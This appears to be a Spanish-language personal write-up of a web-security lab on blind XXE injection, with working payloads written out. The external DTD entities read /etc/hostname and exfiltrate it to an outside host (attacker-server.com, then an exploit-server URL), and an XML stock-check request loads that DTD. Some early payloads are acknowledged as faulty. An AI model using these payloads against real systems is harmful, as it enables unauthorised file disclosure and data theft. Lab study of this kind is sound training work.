![[Pasted image 20230611064705.png]]

Write up de Garrr7: https://youtu.be/wqwUqHA_AJE

Payloads:
External DTD File for Reference:
"<!ENTITY % file SYSTEM "file:///etc/hostname">"
"<!ENTITY % stack SYSTEM "<!ENTITY &#x25; exfil 'http://attacker-server.com/%file;'>" "

![[Pasted image 20230611072330.png]]

consulto el stock de cualquier producto:

![[Pasted image 20230611072610.png]]

![[Pasted image 20230611072635.png]]

Post ProductStock lo mando al Repeater:

![[Pasted image 20230611072723.png]]

en esta parte haremos los primeros cambios:

![[Pasted image 20230611072815.png]]

![[Pasted image 20230611073011.png]]

Aca tengo que cargar el exploit server, copiar la URL y pegarla en el payload:

![[Pasted image 20230611073057.png]]

![[Pasted image 20230611073405.png]]

aca aun no le doy enviar, me paso al exploit server y establezco los payloads:

"
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack SYSTEM "<!ENTITY exfil SYSTEM 'https://exploit-0a2800d60390326b80a9cf4f01b3001b.exploit-server.net/?%file;'>" 

"

![[Pasted image 20230611073937.png]]

en la foto de arriba me falto cerrar el primer ENTITY, aca el cambio:

![[Pasted image 20230614192608.png]]

ahora con esos cambios modifico mi request:

"
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "https://exploit-0a2800d60390326b80a9cf4f01b3001b.exploit-server.net/exploit">%loadDtd;%stack;]><stockCheck><productId>
&exfil;
</productId><storeId>1</storeId></stockCheck>

"

ojo, aun no hay que presionar Store

![[Pasted image 20230611073822.png]]

probando enviar el request:

![[Pasted image 20230611074135.png]]

entonces esto es relacionado a character references, hacienod las modificaciones en los paylods:

"
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack SYSTEM "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a2800d60390326b80a9cf4f01b3001b.exploit-server.net/?%file;'>" 

"

presiono store 

en el repeater:


"
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % loadDtd SYSTEM "https://exploit-0a2800d60390326b80a9cf4f01b3001b.exploit-server.net/exploit">%loadDtd;%stack;%exfil;]><stockCheck><productId>
1
</productId><storeId>1</storeId></stockCheck>

"

![[Pasted image 20230614192907.png]]


envio el request y obtengo:

![[Pasted image 20230611074509.png]]

me vuelvo al exploit server y hoy verifico el access log, pero no obtuve el resultado.

Siguiendo el tutorial de Sommers si pude resolver el lab, aca pongo los payloads:

en el exploit server:

![[Pasted image 20230614194423.png]]

notese que aca el url que estoy usando es del burp collaborator.

En el repeater:

![[Pasted image 20230614194503.png]]

le doy enviar y debe aparecerme esto:

![[Pasted image 20230614194526.png]]

en este momento me paso al collaborator y le doy Poll Now, en el request HTTP veo el valor de la segunda pestana

![[Pasted image 20230614194626.png]]

y justo ese valor es el token:

![[Pasted image 20230614194705.png]]